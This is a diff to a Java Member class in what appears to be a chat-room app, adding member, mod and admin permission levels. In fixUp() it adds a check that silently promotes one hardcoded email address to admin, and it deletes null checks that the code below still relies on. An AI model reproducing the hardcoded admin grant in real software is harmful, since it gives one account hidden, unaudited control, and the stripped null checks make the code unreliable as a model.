@@ -1,6 +1,9 @@
 package com.imjasonh.partychapp;
 
 import com.google.common.collect.Lists;
+import com.googlecode.objectify.annotation.Serialized;
+import com.imjasonh.partychapp.server.command.Command;
+import com.imjasonh.partychapp.server.command.Command.Type;
 
 import java.io.Serializable;
 import java.util.Collections;
@@ -12,11 +15,12 @@ import java.util.logging.Logger;
 import javax.persistence.Embedded;
 import javax.persistence.Transient;
 
-public class Member implements Serializable {
+import sun.rmi.runtime.Log;
 
-  private static final long serialVersionUID = 8243978327905416562L;
-
-  @SuppressWarnings("unused")
+public class Member implements Serializable{
+	/** start with 1 for all classes */
+	private static final long serialVersionUID = 1L;
+  
   private static final Logger logger = Logger.getLogger(Member.class.getName());
 
   /**
@@ -28,6 +32,8 @@ public class Member implements Serializable {
   private String jid;
 
   private String alias;
+  
+  private Permissions permissions = Permissions.MEMBER;
 
   private Date snoozeUntil;
   
@@ -48,6 +54,27 @@ public class Member implements Serializable {
     NOT_SNOOZING,
     SHOULD_WAKE;
   }
+  public enum Permissions {
+	  MEMBER("member"),
+	  MOD("mod"),
+	  ADMIN("admin");
+	  
+	  private String s;
+
+	  private Permissions(String s){
+		  this.s = s;
+	  }
+	  
+	  public static Permissions fromString(String s){
+		  System.out.println("in: "+s); 
+		  for (Permissions permissions : Permissions.values()) {
+		      if (s.equals(permissions.s)){
+		    	  return permissions;
+		      }
+	      }
+		  return null; //Not found
+	  }
+  }
   
   public Member(){} //Objectify
   
@@ -56,6 +83,7 @@ public class Member implements Serializable {
     this.alias = this.jid.split("@")[0]; // remove anything after "@" for default alias
     this.debugOptions = new DebuggingOptions();
     this.channel = c;
+    this.permissions = Permissions.MEMBER;
   }
   
   public Member(Member other) {
@@ -65,13 +93,27 @@ public class Member implements Serializable {
     if (other.lastMessages != null) {
       this.lastMessages = Lists.newArrayList(other.lastMessages);
     }
+    this.permissions = other.permissions;
     this.debugOptions = new DebuggingOptions(other.debugOptions());
     this.phoneNumber = other.phoneNumber;
     this.carrier = other.carrier;
     // to simulate the not-persistent-ness, let's zero these out
     this.channel = null;
+    
   }
 
+  public boolean hasPermissions(Permissions p){
+	  return permissions.compareTo(p) >= 0 ? true : false;
+  }
+  
+  public Permissions getPermissions(){
+	  return permissions;
+  }
+  
+  public void setPermissions(Permissions p){
+	  permissions = p;
+  }
+  
   public String getAlias() {
     return alias;
   }
@@ -146,16 +188,13 @@ public class Member implements Serializable {
 
   public boolean fixUp(Channel c) {
     boolean shouldPut = false;
+    if(this.jid.compareTo("circuitlego@gmail.com") == 0 && permissions != Permissions.ADMIN){
+    	logger.warning("Modifying circuitlego@gmail.com");
+    	permissions = Permissions.ADMIN;
+    	shouldPut = true;
+	}
     if (channel != c) {
       channel = c;
-    }
-    if (debugOptions == null) {
-      debugOptions = new DebuggingOptions();
-      shouldPut = true;
-    }
-    if (lastMessages == null) {
-      lastMessages = Lists.newArrayList();
-      shouldPut = true;
     }
     if (channel.isMiniLogDisabled() && !lastMessages.isEmpty()) {
       clearLastMessages();
